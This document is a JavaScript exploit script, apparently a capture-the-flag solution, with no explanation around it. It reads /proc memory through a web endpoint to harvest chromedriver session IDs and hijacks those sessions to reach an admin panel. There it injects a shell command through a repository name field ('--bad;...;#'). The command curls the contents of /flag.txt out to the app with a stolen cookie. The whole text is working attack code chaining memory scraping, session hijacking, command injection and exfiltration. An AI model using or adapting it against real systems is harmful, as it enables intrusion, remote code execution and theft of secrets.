(async () => {
  const userCookie = decodeURIComponent((document.currentScript.src.split("#")[1] || ""));
  const proc = "/profile/proc/";
  const enc = encodeURIComponent;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const post = (text) => fetch("/edit", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "title=stage&content=" + enc(text.replace(/[^A-Za-z0-9 !.:()]/g, " "))
  });

  const read = async (path) => {
    try {
      const r = await fetch(path);
      return r.status === 200 ? await r.text() : "";
    } catch {
      return "";
    }
  };

  await post("driver start");

  const drivers = [];
  for (let base = 1; base < 12000; base += 80) {
    await Promise.all([...Array(80)].map(async (_, k) => {
      const pid = base + k;
      const cmd = await read(proc + pid + "/cmdline%3f");
      const m = cmd.includes("chromedriver") && cmd.match(/--port=(\d+)/);
      if (m) {
        drivers.push([pid, m[1]]);
      }
    }));
  }

  drivers.sort((a, b) => b[0] - a[0]);
  const activeDrivers = drivers.slice(0, 2);

  await post("drivers " + drivers.length + " use " + activeDrivers.map((x) => x[0]).join("."));

  const sessions = [];
  for (const [pid, port] of activeDrivers) {
    const maps = await read(proc + pid + "/maps%3f");
    let reads = 0;

    for (const line of maps.split("\n")) {
      const parts = line.split(/ +/);
      if (!parts[1] || !parts[1].startsWith("rw")) {
        continue;
      }

      const [start, end] = parts[0].split("-").map((x) => parseInt(x, 16));
      const name = parts.length >= 6 ? parts[5] : "";
      const size = end - start;

      if (size > 0x400000 && name !== "[heap]" && name !== "[stack]") {
        continue;
      }

      for (let off = start; off < end; off += 1500) {
        const data = await read(proc + pid + "/mem%3f?offset=0x" + off.toString(16) + "&limit=1500");
        reads++;

        for (const m of data.matchAll(/[a-f0-9]{32}/g)) {
          const sid = m[0];
          if (new Set(sid).size > 8 && !sessions.some((x) => x[0] === port && x[1] === sid)) {
            sessions.push([port, sid]);
          }
        }

        if (sessions.length > 20) {
          break;
        }
      }

      if (sessions.length > 20) {
        break;
      }
    }

    await post("scan " + pid + " reads " + reads + " sessions " + sessions.length);
  }

  await post("sessions " + sessions.length);

  const cmd = "curl -s --max-time 5 -X POST http://app/edit -H " +
    JSON.stringify("Cookie: " + userCookie) +
    " --data title=flag --data-urlencode content=$(python3 -c 'print(open(\"/flag.txt\",\"rb\").read().hex())')";

  const adminStage = `
    (async () => {
      const f = new FormData();
      f.append("__csrf__", document.querySelector("meta[name=csrf]").content);
      f.append("__json__", JSON.stringify({
        platform: "gitlab",
        name: "--bad;${cmd};#",
        repositoryUrl: "https://gitlab.com/dev-ittechca-com/composer",
        branch: "master"
      }));
      await fetch("/_api/package-manager/add-repository", { method: "POST", body: f });
    })()
  `;

  const helper = open("about:blank", "h");
  helper.sessions = sessions;
  helper.adminStage = adminStage;
  helper.eval(`
    (async () => {
      for (const [port, sid] of sessions) {
        fetch("http://localhost:" + port + "/session/" + sid + "/url", {
          method: "POST",
          mode: "no-cors",
          body: JSON.stringify({ url: "http://admin-app/dashboard/setup" })
        });
      }

      await new Promise((r) => setTimeout(r, 3000));

      for (const [port, sid] of sessions) {
        fetch("http://localhost:" + port + "/session/" + sid + "/execute/sync", {
          method: "POST",
          mode: "no-cors",
          body: JSON.stringify({ script: adminStage, args: [] })
        });
      }
    })()
  `);
})();
